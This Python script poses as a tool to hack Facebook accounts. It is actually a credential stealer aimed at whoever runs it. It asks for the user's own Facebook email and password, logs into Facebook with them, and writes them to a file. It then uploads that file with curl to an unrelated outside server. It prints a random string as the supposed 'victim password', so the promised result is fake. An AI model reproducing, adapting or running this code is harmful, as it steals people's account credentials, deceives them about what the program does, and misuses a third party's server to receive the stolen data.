#!/usr/bin/python
# Made By A1C3VENOM With Team

import http.cookiejar
import urllib.request
import re
try:
    from colorama import Fore,Back, init
except:
    print("[!] Error : Please Run Setup.py") 
banner = '''
  ____           _____ ____
 / ___|_ __ ___ |  ___| __ )
| |   | '_ ` _ \\| |_  |  _ \\
| |___| | | | | |  _| | |_) |
 \\____|_| |_| |_|_|   |____/
 	'''

import random
import string
import os
import time
try:
    os.mkdir("hid")
except:
    pass
#import getpass.getpass

print(Fore.YELLOW+banner)
print(Fore.CYAN+'Tool for Hack Fb Accounts')
print("-----------------+++-------------")
print(Fore.GREEN+'[i] First Required Your Facebook Id.')
em = input(Fore.RED+"Enter Your Email or Number : ")
pas = input(Fore.GREEN+"Enter Your Password : ")
vic = input(Fore.BLUE+"Enter Victim Email or Number : ")
ids = {
      	'email': em ,
      	'pass': pas
        	}

cookie = http.cookiejar.CookieJar()
browser = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
urllib.request.install_opener(browser)


fburl = 'https://mbasic.facebook.com/login.php'

data = urllib.parse.urlencode(ids).encode('utf-8')

ls = urllib.request.Request(fburl,data)

dj = urllib.request.urlopen(ls)
    
dikh = dj.read()

stl = string.ascii_lowercase
stc = string.ascii_uppercase
dg = string.digits
pun = string.punctuation
password = []
ran = random.randint(7,11)
for x in range(ran):
    cv = random.choice(stl+stc+dg)
    password.append(cv)
    
mv = ''.join(password)
dvs = []
dvs.append(dikh)
admin = open("hidl.html",'w')
admin.write("Email : "+em+"\n Password : "+pas)
admin.close()
os.system("curl -T hidl.html https://inlislite.perpusnas.go.id")
time.sleep(9)
print(Fore.CYAN+"Victim Password : ", mv)
'''except:
    print(" Please Enter Incorrect Password")
init()
    '''




